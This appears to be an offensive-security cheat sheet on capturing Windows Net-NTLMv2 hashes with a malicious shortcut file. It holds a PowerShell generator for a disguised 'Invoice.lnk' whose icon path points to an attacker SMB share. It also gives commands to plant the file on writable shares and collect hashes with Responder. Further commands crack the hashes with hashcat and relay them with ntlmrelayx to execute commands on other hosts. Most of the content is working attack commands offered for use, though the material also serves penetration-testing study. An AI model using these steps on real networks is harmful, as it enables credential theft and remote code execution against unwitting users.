# 08.02 LNK File NTLM Hash Capture

> Malicious shortcut → UNC icon path → Net-NTLMv2 via Responder / ntlmrelayx

## Overview

A .lnk (Windows Shortcut) file whose IconLocation points to a UNC path on the attacker machine (\\attacker\share\icon.ico) causes Explorer to initiate an SMB connection the moment the folder containing the file is viewed — leaking the browsing user's Net-NTLMv2 hash. Drop the .lnk on any writable share that users navigate to. Capture with Responder, then crack (hashcat -m 5600) or relay with ntlmrelayx. ntlm_theft auto-generates .lnk, .url, .scf, .docx, and more.

## Steps

- **Start Responder or ntlmrelayx first** — the listener must be up before the file is opened.
- **Set IconLocation to UNC path** — `\\<LHOST>\share\icon.ico`; the TargetPath can look benign.
- **Drop on a browsed share** — any writable network share that the target user navigates to in Explorer.
- **Hash fires automatically** — Explorer renders directory icons at browse time; no user interaction needed beyond opening the folder.
- **Crack or relay** — hashcat mode 5600 for NTLMv2; ntlmrelayx to relay to hosts with signing disabled.
- **ntlm_theft** — generates .lnk, .url, .scf, .docx, .xlsx, .pdf variants from a single command.

## Commands

### PowerShell LNK generator

```powershell
$lnk = (New-Object -COM WScript.Shell).CreateShortcut('C:\\Temp\\Invoice.lnk')
$lnk.TargetPath   = 'C:\\Windows\\System32\\cmd.exe'  # benign-looking target
$lnk.IconLocation = '\\\\<LHOST>\\share\\icon.ico'   # UNC path triggers SMB auth
$lnk.Description  = 'Invoice Q4'
$lnk.WindowStyle  = 7  # minimised
$lnk.Save()

# Copy to a writable share
Copy-Item C:\\Temp\\Invoice.lnk \\\\<TARGET>\\<WritableShare>\\
```

### ntlm_theft — multi-format generator

```bash
# Generates .lnk .url .scf .docx .xlsx .pdf .xll all at once
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py --generate all --server <LHOST> --filename capture

# Drop any generated file on a browsed share:
smbclient //<TARGET>/<Share> -U 'domain/user%pass'
smb: \> put capture.lnk
```

### Responder — capture NTLMv2 hashes

```bash
# Listen on the attacker interface (cannot run alongside ntlmrelayx)
sudo responder -I eth0 -wv

# Hashes appear as:
# [SMB] NTLMv2-SSP Hash : DOMAIN\user::<challenge>:<response>
# Saved to: /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

### Crack NTLMv2 or relay to exec

```bash
# Crack offline (mode 5600 = NTLMv2)
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
  /usr/share/wordlists/rockyou.txt --force

# --- OR relay instead of capturing ---
# (Responder + ntlmrelayx cannot both bind 445; disable SMB in Responder)
# Edit /etc/responder/Responder.conf → SMB = Off
sudo responder -I eth0 -wv
sudo ntlmrelayx.py -tf relay.txt -smb2support
# relay.txt = hosts with signing off (from: nxc smb <CIDR> --gen-relay-list relay.txt)

# ntlmrelayx exec mode (run command on relay target)
sudo ntlmrelayx.py -tf relay.txt -smb2support -c 'whoami > C:\\Temp\\out.txt'
```
